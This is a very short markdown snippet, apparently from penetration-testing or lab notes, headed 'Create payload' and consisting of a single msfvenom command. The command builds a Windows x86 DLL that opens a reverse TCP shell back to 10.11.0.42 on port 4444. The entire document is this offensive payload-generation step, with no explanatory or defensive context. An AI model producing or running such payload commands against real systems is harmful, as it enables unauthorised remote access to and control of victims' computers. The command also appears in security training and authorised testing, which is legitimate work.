
## Create payload
```
msfvenom -p windows/shell/reverse_tcp -f dll -a x86 LHOST=10.11.0.42 LPORT=4444 -o reverse-shell.dll --platform windows
```
